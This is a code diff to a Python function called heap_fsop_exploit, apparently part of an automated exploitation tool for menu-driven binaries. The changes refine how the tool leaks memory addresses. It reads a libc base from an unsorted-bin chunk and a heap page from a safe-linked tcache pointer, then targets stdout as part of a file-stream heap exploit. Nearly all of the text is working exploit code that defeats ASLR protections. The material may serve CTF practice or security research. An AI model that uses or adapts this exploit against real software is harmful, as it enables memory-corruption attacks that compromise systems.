@@ -1953,38 +1953,53 @@ def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_dat
             return b""
         return _read_until(p, time.time() + read_secs, quiet=0.2)
 
-    def _words(out):
-        """8-byte little-endian windows of the view output that could be a POINTER. A real menu
-        prints a prompt ("idx: ", "Content: ") before the raw chunk bytes, so the pointer is NOT at
-        offset 0; scan every window and drop any whose non-zero bytes are all printable ASCII -- that
-        is prompt text, never a pointer (a real pointer always carries a non-printable byte: the
-        0x55/0x7f image byte, or the 0x05-ish high byte of a safe-linked heap page)."""
+    def _windows(out):
+        """(offset, value) for each 8-byte little-endian window of a view's output that could be a
+        POINTER. A real menu may print a prompt ("idx: ", "Content: ") before the raw chunk bytes, so
+        the pointer is not necessarily at offset 0. A window whose non-zero bytes are all printable
+        ASCII is prompt text, never a pointer (a pointer carries a non-printable byte), so skip it."""
         for i in range(max(0, len(out) - 7)):
             win = out[i:i + 8]
             if all(b == 0 or 0x20 <= b <= 0x7e for b in win):
                 continue
-            yield _struct.unpack("<Q", win)[0]
+            yield i, _struct.unpack("<Q", win)[0]
 
     try:
         _read_until(p, time.time() + 0.5)
-        # 1) libc leak via the unsorted bin -- the first window that resolves to a PAGE-ALIGNED libc
-        #    base (resolve_libc_base's guard) is the main_arena fd, past any prompt text.
+        # 1) libc leak via the unsorted bin: the first window resolving to a PAGE-ALIGNED libc base is
+        #    the main_arena fd. A window straddling the prompt cannot pass that guard (its low byte is
+        #    ASCII, never main_arena's low byte), so the match offset is exactly where this view's raw
+        #    chunk bytes begin past any prompt -- the calibration step 2 reuses.
         _op(add(0, guard_size, b"A"))
         _op(add(1, guard_size, b"B"))               # guard: stops back-consolidation with the top
         _op(free(0))
         vout = _op(view(0), 0.5)
-        base = next((b for b in (rop.resolve_libc_base(v, unsorted_off) for v in _words(vout)) if b), 0)
+        data_off, base = 0, None
+        for i, v in _windows(vout):
+            if v < (1 << 47):
+                base = rop.resolve_libc_base(v, unsorted_off)
+                if base:
+                    data_off = i
+                    break
         if not base:
             return {"ok": False, "reason": f"libc leak failed (dump {vout[:32].hex()})"}
         stdout_addr = base + T["stdout"]
-        # 2) heap leak via a freed tcache chunk's safe-linked fd == chunk2>>12. A heap page shifted
-        #    right by 12 is a small value (~0x55xxxxxxx, < 2**40), which also separates it from the
-        #    libc pointer (> 2**46) and from a misaligned window that straddles the prompt.
+        # 2) heap leak via a freed tcache chunk's safe-linked fd == chunk2>>12. The fd sits at the
+        #    SAME offset in this view's output as the libc fd did (same view op, same prompts), so read
+        #    it there rather than guessing where a prompt ends -- a non-PIE heap page is tiny (~0x405)
+        #    and indistinguishable by value from a misaligned prompt-straddling window. Fall back to a
+        #    scan only when the calibrated word is implausible (prompt timing shifted the output).
         _op(add(2, poison_size, b"C"))
         _op(add(3, poison_size, b"D"))
         _op(free(2))
         hout = _op(view(2), 0.5)
-        heap_page = next((v for v in _words(hout) if 0x1000 <= v < (1 << 40)), 0)
+        heap_page = 0
+        if len(hout) >= data_off + 8:
+            cand = _struct.unpack("<Q", hout[data_off:data_off + 8])[0]
+            if 0 < cand < (1 << 40):
+                heap_page = cand
+        if not heap_page:
+            heap_page = next((v for _, v in _windows(hout) if 0 < v < (1 << 40)), 0)
         if not heap_page:
             return {"ok": False, "reason": f"heap leak failed (dump {hout[:32].hex()})"}
         _op(add(2, poison_size, b"C"))               # take chunk2 back; tcache empty for this size
